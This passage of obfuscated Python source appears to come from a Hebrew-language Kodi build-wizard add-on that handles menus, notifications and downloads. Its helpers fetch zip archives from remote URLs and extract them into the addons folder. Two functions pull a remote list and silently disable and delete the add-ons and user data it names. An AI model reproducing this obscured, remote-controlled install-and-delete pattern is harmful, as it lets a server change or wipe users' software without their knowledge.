				O00OO00000OOO0O00 =O0000OO0O0OO000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5151
				if not wiz .workingURL (O0OOO0OOO0O00OO00 )==True :return #line:5152
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5153
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0000OO0O0OO000O0 ),'','אנא המתן')#line:5154
				OOOOOOO00OOO0OOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OO00000OOO0O00 )#line:5155
				try :os .remove (OOOOOOO00OOO0OOOO )#line:5156
				except :pass #line:5157
				logging .warning (O0OOO0OOO0O00OO00 )#line:5158
				if 'google'in O0OOO0OOO0O00OO00 :#line:5159
				   OOOO0O000OO00O0O0 =googledrive_download (O0OOO0OOO0O00OO00 ,OOOOOOO00OOO0OOOO ,DP ,wiz .checkBuild (O0000OO0O0OO000O0 ,'filesize'))#line:5160
				else :#line:5163
				  downloader .download (O0OOO0OOO0O00OO00 ,OOOOOOO00OOO0OOOO ,DP )#line:5164
				xbmc .sleep (100 )#line:5165
				OO0000OOO00OO0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0O0OO000O0 )#line:5166
				DP .update (0 ,OO0000OOO00OO0O00 ,'','אנא המתן')#line:5167
				extract .all (OOOOOOO00OOO0OOOO ,HOME ,DP ,title =OO0000OOO00OO0O00 )#line:5168
				DP .close ()#line:5169
				wiz .defaultSkin ()#line:5170
				wiz .lookandFeelData ('save')#line:5171
				if KODIV >=18 :#line:5172
					skindialogsettind18 ()#line:5173
				if INSTALLMETHOD ==1 :O0OOO00OO0OOO00O0 =1 #line:5176
				elif INSTALLMETHOD ==2 :O0OOO00OO0OOO00O0 =0 #line:5177
				else :DP .close ()#line:5178
def gaiaserenaddon ():#line:5180
  OOO0O0O00O000OO00 =(ADDON .getSetting ("gaiaseren"))#line:5181
  OOO00OO000O0O000O =(ADDON .getSetting ("auto_rd"))#line:5182
  if OOO0O0O00O000OO00 =='true'and OOO00OO000O0O000O =='true':#line:5183
    O00O0OO0OO00O0OO0 =(NEWFASTUPDATE )#line:5184
    OOO0OOOO00OOOOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5185
    O0O0OO0OO0O0O00OO =xbmcgui .DialogProgress ()#line:5186
    O0O0OO0OO0O0O00OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5187
    OO0O000000000000O =os .path .join (PACKAGES ,'isr.zip')#line:5188
    OOOO0OO000OOOOO00 =urllib2 .Request (O00O0OO0OO00O0OO0 )#line:5189
    O0OO0O0O00OO000O0 =urllib2 .urlopen (OOOO0OO000OOOOO00 )#line:5190
    O0OO0000000000000 =xbmcgui .DialogProgress ()#line:5192
    O0OO0000000000000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5193
    O0OO0000000000000 .update (0 )#line:5194
    OOO0OO00O00O0O0OO =open (OO0O000000000000O ,'wb')#line:5196
    try :#line:5198
      OO0O00O0O0O0OO00O =O0OO0O0O00OO000O0 .info ().getheader ('Content-Length').strip ()#line:5199
      OO0000O000O000OO0 =True #line:5200
    except AttributeError :#line:5201
          OO0000O000O000OO0 =False #line:5202
    if OO0000O000O000OO0 :#line:5204
          OO0O00O0O0O0OO00O =int (OO0O00O0O0O0OO00O )#line:5205
    OOO000OOO000O000O =0 #line:5207
    O0OO00O000O00OOOO =time .time ()#line:5208
    while True :#line:5209
          O000O00O00O00OOOO =O0OO0O0O00OO000O0 .read (8192 )#line:5210
          if not O000O00O00O00OOOO :#line:5211
              sys .stdout .write ('\n')#line:5212
              break #line:5213
          OOO000OOO000O000O +=len (O000O00O00O00OOOO )#line:5215
          OOO0OO00O00O0O0OO .write (O000O00O00O00OOOO )#line:5216
          if not OO0000O000O000OO0 :#line:5218
              OO0O00O0O0O0OO00O =OOO000OOO000O000O #line:5219
          if O0OO0000000000000 .iscanceled ():#line:5220
             O0OO0000000000000 .close ()#line:5221
             try :#line:5222
              os .remove (OO0O000000000000O )#line:5223
             except :#line:5224
              pass #line:5225
             break #line:5226
          OO0OOO0O000O0OOO0 =float (OOO000OOO000O000O )/OO0O00O0O0O0OO00O #line:5227
          OO0OOO0O000O0OOO0 =round (OO0OOO0O000O0OOO0 *100 ,2 )#line:5228
          O000OO00O0O0OOOOO =OOO000OOO000O000O /(1024 *1024 )#line:5229
          OOO000000O00O0OO0 =OO0O00O0O0O0OO00O /(1024 *1024 )#line:5230
          OOO000000000000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OO00O0O0OOOOO ,'teal',OOO000000O00O0OO0 )#line:5231
          if (time .time ()-O0OO00O000O00OOOO )>0 :#line:5232
            O0000O0OO00OO000O =OOO000OOO000O000O /(time .time ()-O0OO00O000O00OOOO )#line:5233
            O0000O0OO00OO000O =O0000O0OO00OO000O /1024 #line:5234
          else :#line:5235
           O0000O0OO00OO000O =0 #line:5236
          OOOOOOO00000OOOO0 ='KB'#line:5237
          if O0000O0OO00OO000O >=1024 :#line:5238
             O0000O0OO00OO000O =O0000O0OO00OO000O /1024 #line:5239
             OOOOOOO00000OOOO0 ='MB'#line:5240
          if O0000O0OO00OO000O >0 and not OO0OOO0O000O0OOO0 ==100 :#line:5241
              O0OOOO0OOO0OO0OO0 =(OO0O00O0O0O0OO00O -OOO000OOO000O000O )/O0000O0OO00OO000O #line:5242
          else :#line:5243
              O0OOOO0OOO0OO0OO0 =0 #line:5244
          OOOO00O000O00OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0000O0OO00OO000O ,OOOOOOO00000OOOO0 )#line:5245
          O0OO0000000000000 .update (int (OO0OOO0O000O0OOO0 ),OOO000000000000OO ,OOOO00O000O00OOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5247
    OOO00000OOO0O00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5250
    OOO0OO00O00O0O0OO .close ()#line:5253
    extract .all (OO0O000000000000O ,OOO00000OOO0O00O0 ,O0OO0000000000000 )#line:5254
    try :#line:5258
      os .remove (OO0O000000000000O )#line:5259
    except :#line:5260
      pass #line:5261
def iptvsimpldownpc ():#line:5262
    O00OO0OO0OOO0O00O =(IPTVSIMPL18PC )#line:5264
    OOO00O0O00OO0OO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5265
    O0000OO0OO0OOOOO0 =xbmcgui .DialogProgress ()#line:5266
    O0000OO0OO0OOOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5267
    O000OOOO00O00OO0O =os .path .join (PACKAGES ,'isr.zip')#line:5268
    OO0O000OO00OOO00O =urllib2 .Request (O00OO0OO0OOO0O00O )#line:5269
    O00O00O000000OOO0 =urllib2 .urlopen (OO0O000OO00OOO00O )#line:5270
    O0O0O0O00O00O0O00 =xbmcgui .DialogProgress ()#line:5272
    O0O0O0O00O00O0O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5273
    O0O0O0O00O00O0O00 .update (0 )#line:5274
    O0OOOO00OO0000O0O =open (O000OOOO00O00OO0O ,'wb')#line:5276
    try :#line:5278
      O00OO000O0O0000OO =O00O00O000000OOO0 .info ().getheader ('Content-Length').strip ()#line:5279
      O00O0OO0000000OOO =True #line:5280
    except AttributeError :#line:5281
          O00O0OO0000000OOO =False #line:5282
    if O00O0OO0000000OOO :#line:5284
          O00OO000O0O0000OO =int (O00OO000O0O0000OO )#line:5285
    OOO0OOOOO0O0O0O00 =0 #line:5287
    OOO0OOOO00000O000 =time .time ()#line:5288
    while True :#line:5289
          O0O00OOOOO000O0OO =O00O00O000000OOO0 .read (8192 )#line:5290
          if not O0O00OOOOO000O0OO :#line:5291
              sys .stdout .write ('\n')#line:5292
              break #line:5293
          OOO0OOOOO0O0O0O00 +=len (O0O00OOOOO000O0OO )#line:5295
          O0OOOO00OO0000O0O .write (O0O00OOOOO000O0OO )#line:5296
          if not O00O0OO0000000OOO :#line:5298
              O00OO000O0O0000OO =OOO0OOOOO0O0O0O00 #line:5299
          if O0O0O0O00O00O0O00 .iscanceled ():#line:5300
             O0O0O0O00O00O0O00 .close ()#line:5301
             try :#line:5302
              os .remove (O000OOOO00O00OO0O )#line:5303
             except :#line:5304
              pass #line:5305
             break #line:5306
          OOOO0000O0O0OO000 =float (OOO0OOOOO0O0O0O00 )/O00OO000O0O0000OO #line:5307
          OOOO0000O0O0OO000 =round (OOOO0000O0O0OO000 *100 ,2 )#line:5308
          O0OO0OO0000O0OO0O =OOO0OOOOO0O0O0O00 /(1024 *1024 )#line:5309
          OOO00O0O0OO0O0O0O =O00OO000O0O0000OO /(1024 *1024 )#line:5310
          OO00O000O0OO0OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0OO0000O0OO0O ,'teal',OOO00O0O0OO0O0O0O )#line:5311
          if (time .time ()-OOO0OOOO00000O000 )>0 :#line:5312
            O0OO0OOO0OO0O0000 =OOO0OOOOO0O0O0O00 /(time .time ()-OOO0OOOO00000O000 )#line:5313
            O0OO0OOO0OO0O0000 =O0OO0OOO0OO0O0000 /1024 #line:5314
          else :#line:5315
           O0OO0OOO0OO0O0000 =0 #line:5316
          OO00O0OOO000O0O0O ='KB'#line:5317
          if O0OO0OOO0OO0O0000 >=1024 :#line:5318
             O0OO0OOO0OO0O0000 =O0OO0OOO0OO0O0000 /1024 #line:5319
             OO00O0OOO000O0O0O ='MB'#line:5320
          if O0OO0OOO0OO0O0000 >0 and not OOOO0000O0O0OO000 ==100 :#line:5321
              OOOOO0OO0O0O00OOO =(O00OO000O0O0000OO -OOO0OOOOO0O0O0O00 )/O0OO0OOO0OO0O0000 #line:5322
          else :#line:5323
              OOOOO0OO0O0O00OOO =0 #line:5324
          OOOOO0OO0O0OOOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OOO0OO0O0000 ,OO00O0OOO000O0O0O )#line:5325
          O0O0O0O00O00O0O00 .update (int (OOOO0000O0O0OO000 ),OO00O000O0OO0OO0O ,OOOOO0OO0O0OOOO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5327
    O0OO000OO0000O00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5330
    O0OOOO00OO0000O0O .close ()#line:5333
    extract .all (O000OOOO00O00OO0O ,O0OO000OO0000O00O ,O0O0O0O00O00O0O00 )#line:5334
    try :#line:5338
      os .remove (O000OOOO00O00OO0O )#line:5339
    except :#line:5340
      pass #line:5341
def iptvsimpldown ():#line:5342
    OO0OO000OOOOOOOO0 =(IPTV18 )#line:5344
    OO0O0OO00OOO0OO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5345
    O000O0O0O00000O00 =xbmcgui .DialogProgress ()#line:5346
    O000O0O0O00000O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5347
    OO000O00000O0OOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5348
    O00O00O0OOO00O0OO =urllib2 .Request (OO0OO000OOOOOOOO0 )#line:5349
    O00OO000000O0O0O0 =urllib2 .urlopen (O00O00O0OOO00O0OO )#line:5350
    OOO000O00O000OOOO =xbmcgui .DialogProgress ()#line:5352
    OOO000O00O000OOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5353
    OOO000O00O000OOOO .update (0 )#line:5354
    OO0OOOOOOO0O00O0O =open (OO000O00000O0OOO0 ,'wb')#line:5356
    try :#line:5358
      O00O0O00OOO0OO000 =O00OO000000O0O0O0 .info ().getheader ('Content-Length').strip ()#line:5359
      O00000O0OOO0000OO =True #line:5360
    except AttributeError :#line:5361
          O00000O0OOO0000OO =False #line:5362
    if O00000O0OOO0000OO :#line:5364
          O00O0O00OOO0OO000 =int (O00O0O00OOO0OO000 )#line:5365
    OO0OO00O0O0O00000 =0 #line:5367
    OOOOO0O0O0OOO0OOO =time .time ()#line:5368
    while True :#line:5369
          OOOOO0O0O000O0000 =O00OO000000O0O0O0 .read (8192 )#line:5370
          if not OOOOO0O0O000O0000 :#line:5371
              sys .stdout .write ('\n')#line:5372
              break #line:5373
          OO0OO00O0O0O00000 +=len (OOOOO0O0O000O0000 )#line:5375
          OO0OOOOOOO0O00O0O .write (OOOOO0O0O000O0000 )#line:5376
          if not O00000O0OOO0000OO :#line:5378
              O00O0O00OOO0OO000 =OO0OO00O0O0O00000 #line:5379
          if OOO000O00O000OOOO .iscanceled ():#line:5380
             OOO000O00O000OOOO .close ()#line:5381
             try :#line:5382
              os .remove (OO000O00000O0OOO0 )#line:5383
             except :#line:5384
              pass #line:5385
             break #line:5386
          O0O0O0O00000O00OO =float (OO0OO00O0O0O00000 )/O00O0O00OOO0OO000 #line:5387
          O0O0O0O00000O00OO =round (O0O0O0O00000O00OO *100 ,2 )#line:5388
          O000OO000OO0O0OO0 =OO0OO00O0O0O00000 /(1024 *1024 )#line:5389
          OO00OOO0O0OO00O0O =O00O0O00OOO0OO000 /(1024 *1024 )#line:5390
          O0O0O00OO0000000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OO000OO0O0OO0 ,'teal',OO00OOO0O0OO00O0O )#line:5391
          if (time .time ()-OOOOO0O0O0OOO0OOO )>0 :#line:5392
            OO00OOOOOOOOO00OO =OO0OO00O0O0O00000 /(time .time ()-OOOOO0O0O0OOO0OOO )#line:5393
            OO00OOOOOOOOO00OO =OO00OOOOOOOOO00OO /1024 #line:5394
          else :#line:5395
           OO00OOOOOOOOO00OO =0 #line:5396
          OO00O0OOOOO0O00O0 ='KB'#line:5397
          if OO00OOOOOOOOO00OO >=1024 :#line:5398
             OO00OOOOOOOOO00OO =OO00OOOOOOOOO00OO /1024 #line:5399
             OO00O0OOOOO0O00O0 ='MB'#line:5400
          if OO00OOOOOOOOO00OO >0 and not O0O0O0O00000O00OO ==100 :#line:5401
              OOO0O0O00O0O0O00O =(O00O0O00OOO0OO000 -OO0OO00O0O0O00000 )/OO00OOOOOOOOO00OO #line:5402
          else :#line:5403
              OOO0O0O00O0O0O00O =0 #line:5404
          OO0O0OOO000OOOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00OOOOOOOOO00OO ,OO00O0OOOOO0O00O0 )#line:5405
          OOO000O00O000OOOO .update (int (O0O0O0O00000O00OO ),O0O0O00OO0000000O ,OO0O0OOO000OOOO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5407
    O00OOOOOO00OO000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5410
    OO0OOOOOOO0O00O0O .close ()#line:5413
    extract .all (OO000O00000O0OOO0 ,O00OOOOOO00OO000O ,OOO000O00O000OOOO )#line:5414
    try :#line:5418
      os .remove (OO000O00000O0OOO0 )#line:5419
    except :#line:5420
      pass #line:5421
def testnotify ():#line:5422
	OO0OOO00OO0OO0O00 =wiz .workingURL (NOTIFICATION )#line:5423
	if OO0OOO00OO0OO0O00 ==True :#line:5424
		try :#line:5425
			O0000OOO00000OO00 ,O0OO0OO0OO0OO0O0O =wiz .splitNotify (NOTIFICATION )#line:5426
			if O0000OOO00000OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5427
			if STARTP2 ()=='ok':#line:5428
				notify .notification (O0OO0OO0OO0OO0O0O ,True )#line:5429
		except Exception as OOO0OO00O000O000O :#line:5430
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO00O000O000O ),xbmc .LOGERROR )#line:5431
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5432
def testnotify2 ():#line:5433
	O0O0O00O00OOO0O00 =wiz .workingURL (NOTIFICATION2 )#line:5434
	if O0O0O00O00OOO0O00 ==True :#line:5435
		try :#line:5436
			OOOO00OO00OOOO000 ,OO0O0000OOOO0O000 =wiz .splitNotify (NOTIFICATION2 )#line:5437
			if OOOO00OO00OOOO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5438
			if STARTP2 ()=='ok':#line:5439
				notify .notification2 (OO0O0000OOOO0O000 ,True )#line:5440
		except Exception as OOO0OOO0O0O00OOO0 :#line:5441
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OOO0O0O00OOO0 ),xbmc .LOGERROR )#line:5442
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5443
def testnotify3 ():#line:5444
	OOO000OOO0O0O0O00 =wiz .workingURL (NOTIFICATION3 )#line:5445
	if OOO000OOO0O0O0O00 ==True :#line:5446
		try :#line:5447
			OO0O0OOO00OO0OO0O ,O0000OO000OO0O0OO =wiz .splitNotify (NOTIFICATION3 )#line:5448
			if OO0O0OOO00OO0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5449
			if STARTP2 ()=='ok':#line:5450
				notify .notification3 (O0000OO000OO0O0OO ,True )#line:5451
		except Exception as OO00O0OOO0O000OO0 :#line:5452
			wiz .log ("Error on Notifications Window: %s"%str (OO00O0OOO0O000OO0 ),xbmc .LOGERROR )#line:5453
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5454
def servicemanual ():#line:5455
	O000OOOOOOOOO00O0 =wiz .workingURL (HELPINFO )#line:5456
	if O000OOOOOOOOO00O0 ==True :#line:5457
		try :#line:5458
			O00OO0OOOO00OOO0O ,O0000000OO0OOOO00 =wiz .splitNotify (HELPINFO )#line:5459
			if O00OO0OOOO00OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5460
			notify .helpinfo (O0000000OO0OOOO00 ,True )#line:5461
		except Exception as O000OO0O0OO000OOO :#line:5462
			wiz .log ("Error on Notifications Window: %s"%str (O000OO0O0OO000OOO ),xbmc .LOGERROR )#line:5463
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5464
def testupdate ():#line:5466
	if BUILDNAME =="":#line:5467
		notify .updateWindow ()#line:5468
	else :#line:5469
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5470
def testfirst ():#line:5472
	notify .firstRun ()#line:5473
def testfirstRun ():#line:5475
	notify .firstRunSettings ()#line:5476
def fastinstall ():#line:5479
	notify .firstRuninstall ()#line:5480
def addDir (O000000000000OO0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5487
	OOO000OO000OO0OOO =sys .argv [0 ]#line:5488
	if not mode ==None :OOO000OO000OO0OOO +="?mode=%s"%urllib .quote_plus (mode )#line:5489
	if not name ==None :OOO000OO000OO0OOO +="&name="+urllib .quote_plus (name )#line:5490
	if not url ==None :OOO000OO000OO0OOO +="&url="+urllib .quote_plus (url )#line:5491
	O00OOOOO0O000O0O0 =True #line:5492
	if themeit :O000000000000OO0O =themeit %O000000000000OO0O #line:5493
	O0OOO00OOOOOO0O00 =xbmcgui .ListItem (O000000000000OO0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5494
	O0OOO00OOOOOO0O00 .setInfo (type ="Video",infoLabels ={"Title":O000000000000OO0O ,"Plot":description })#line:5495
	O0OOO00OOOOOO0O00 .setProperty ("Fanart_Image",fanart )#line:5496
	if not menu ==None :O0OOO00OOOOOO0O00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5497
	O00OOOOO0O000O0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO000OO000OO0OOO ,listitem =O0OOO00OOOOOO0O00 ,isFolder =True )#line:5498
	return O00OOOOO0O000O0O0 #line:5499
def addFile (O0O00O0O0O000OO00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5501
	OOO0O0O000O0OOOO0 =sys .argv [0 ]#line:5502
	if not mode ==None :OOO0O0O000O0OOOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:5503
	if not name ==None :OOO0O0O000O0OOOO0 +="&name="+urllib .quote_plus (name )#line:5504
	if not url ==None :OOO0O0O000O0OOOO0 +="&url="+urllib .quote_plus (url )#line:5505
	O00OOO0OO00O000O0 =True #line:5506
	if themeit :O0O00O0O0O000OO00 =themeit %O0O00O0O0O000OO00 #line:5507
	O00O0OO0O00O0000O =xbmcgui .ListItem (O0O00O0O0O000OO00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5508
	O00O0OO0O00O0000O .setInfo (type ="Video",infoLabels ={"Title":O0O00O0O0O000OO00 ,"Plot":description })#line:5509
	O00O0OO0O00O0000O .setProperty ("Fanart_Image",fanart )#line:5510
	if not menu ==None :O00O0OO0O00O0000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5511
	O00OOO0OO00O000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0O0O000O0OOOO0 ,listitem =O00O0OO0O00O0000O ,isFolder =False )#line:5512
	return O00OOO0OO00O000O0 #line:5513
def get_params ():#line:5515
	O0000OO0000O0O00O =[]#line:5516
	OO00000O0O000OO00 =sys .argv [2 ]#line:5517
	if len (OO00000O0O000OO00 )>=2 :#line:5518
		O000O0O00OO0O00OO =sys .argv [2 ]#line:5519
		OOO0OO000O0O00OO0 =O000O0O00OO0O00OO .replace ('?','')#line:5520
		if (O000O0O00OO0O00OO [len (O000O0O00OO0O00OO )-1 ]=='/'):#line:5521
			O000O0O00OO0O00OO =O000O0O00OO0O00OO [0 :len (O000O0O00OO0O00OO )-2 ]#line:5522
		O0OO000O0OO00OO0O =OOO0OO000O0O00OO0 .split ('&')#line:5523
		O0000OO0000O0O00O ={}#line:5524
		for OOOO00O00OO0O00OO in range (len (O0OO000O0OO00OO0O )):#line:5525
			O0OO0O0OO00O0OOO0 ={}#line:5526
			O0OO0O0OO00O0OOO0 =O0OO000O0OO00OO0O [OOOO00O00OO0O00OO ].split ('=')#line:5527
			if (len (O0OO0O0OO00O0OOO0 ))==2 :#line:5528
				O0000OO0000O0O00O [O0OO0O0OO00O0OOO0 [0 ]]=O0OO0O0OO00O0OOO0 [1 ]#line:5529
		return O0000OO0000O0O00O #line:5531
def remove_addons ():#line:5533
	try :#line:5534
			import json #line:5535
			OOO0000O0O0OO0O0O =urllib2 .urlopen (remove_url ).readlines ()#line:5536
			for OO0O0O0OO000O00O0 in OOO0000O0O0OO0O0O :#line:5537
				O0O00O0000O000OOO =OO0O0O0OO000O00O0 .split (':')[1 ].strip ()#line:5539
				OOOO0OOO0OOO00OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0O00O0000O000OOO ,'false')#line:5540
				O0O0O00OO000OOOO0 =xbmc .executeJSONRPC (OOOO0OOO0OOO00OOO )#line:5541
				OOO00O0O0000OOO00 =json .loads (O0O0O00OO000OOOO0 )#line:5542
				OO0O000OO000OOOOO =os .path .join (addons_folder ,O0O00O0000O000OOO )#line:5544
				if os .path .exists (OO0O000OO000OOOOO ):#line:5546
					for OOOO00OOO0OO00000 ,OO0O000OOOO000OOO ,OOO0O0OO00O0000OO in os .walk (OO0O000OO000OOOOO ):#line:5547
						for O0O00OO00OOO00O0O in OOO0O0OO00O0000OO :#line:5548
							os .unlink (os .path .join (OOOO00OOO0OO00000 ,O0O00OO00OOO00O0O ))#line:5549
						for OOOOOO00000OOOO00 in OO0O000OOOO000OOO :#line:5550
							shutil .rmtree (os .path .join (OOOO00OOO0OO00000 ,OOOOOO00000OOOO00 ))#line:5551
					os .rmdir (OO0O000OO000OOOOO )#line:5552
			xbmc .executebuiltin ('Container.Refresh')#line:5554
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5555
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5556
	except :pass #line:5557
def remove_addons2 ():#line:5558
	try :#line:5559
			import json #line:5560
			O0O0O0O0000O0OO00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5561
			for OOO00OO000O00000O in O0O0O0O0000O0OO00 :#line:5562
				OO0O00O0OOOOOOO00 =OOO00OO000O00000O .split (':')[1 ].strip ()#line:5564
				O0OOOO000OOOOOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0O00O0OOOOOOO00 ,'false')#line:5565
				O0O00000OO0O00OOO =xbmc .executeJSONRPC (O0OOOO000OOOOOOOO )#line:5566
				OO0OO00OOOOOO0O0O =json .loads (O0O00000OO0O00OOO )#line:5567
				OO0000OO00O0000O0 =os .path .join (user_folder ,OO0O00O0OOOOOOO00 )#line:5569
				if os .path .exists (OO0000OO00O0000O0 ):#line:5571
					for OO0000OO0O0OOO000 ,O00O0000000O000O0 ,O0OOO0OOOO000000O in os .walk (OO0000OO00O0000O0 ):#line:5572
						for O000000OOO0000O00 in O0OOO0OOOO000000O :#line:5573
							os .unlink (os .path .join (OO0000OO0O0OOO000 ,O000000OOO0000O00 ))#line:5574
						for O0O00OO000O00O0O0 in O00O0000000O000O0 :#line:5575
							shutil .rmtree (os .path .join (OO0000OO0O0OOO000 ,O0O00OO000O00O0O0 ))#line:5576
					os .rmdir (OO0000OO00O0000O0 )#line:5577
	except :pass #line:5579
params =get_params ()#line:5580
url =None #line:5581
name =None #line:5582
mode =None #line:5583
try :mode =urllib .unquote_plus (params ["mode"])#line:5585
except :pass #line:5586
try :name =urllib .unquote_plus (params ["name"])#line:5587
except :pass #line:5588
try :url =urllib .unquote_plus (params ["url"])#line:5589
except :pass #line:5590
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5592
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5593
def setView (O0OOO00O000O0O00O ,OO0O0OOOOOOO000O0 ):#line:5594
	if wiz .getS ('auto-view')=='true':#line:5595
		OO0OOOOOOO0O000O0 =wiz .getS (OO0O0OOOOOOO000O0 )#line:5596
		if OO0OOOOOOO0O000O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0OOOOOOO0O000O0 ='55'#line:5597
		if OO0OOOOOOO0O000O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0OOOOOOO0O000O0 ='50'#line:5598
		wiz .ebi ("Container.SetViewMode(%s)"%OO0OOOOOOO0O000O0 )#line:5599
if mode ==None :index ()#line:5601
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5603
elif mode =='builds':buildMenu ()#line:5604
elif mode =='viewbuild':viewBuild (name )#line:5605
elif mode =='buildinfo':buildInfo (name )#line:5606
elif mode =='buildpreview':buildVideo (name )#line:5607
elif mode =='install':buildWizard (name ,url )#line:5608
elif mode =='theme':buildWizard (name ,mode ,url )#line:5609
elif mode =='viewthirdparty':viewThirdList (name )#line:5610
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5611
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5612
elif mode =='maint':maintMenu (name )#line:5614
elif mode =='passpin':passandpin ()#line:5615
elif mode =='backmyupbuild':backmyupbuild ()#line:5616
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5617
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5618
elif mode =='advancedsetting':advancedWindow (name )#line:5619
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5620
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5621
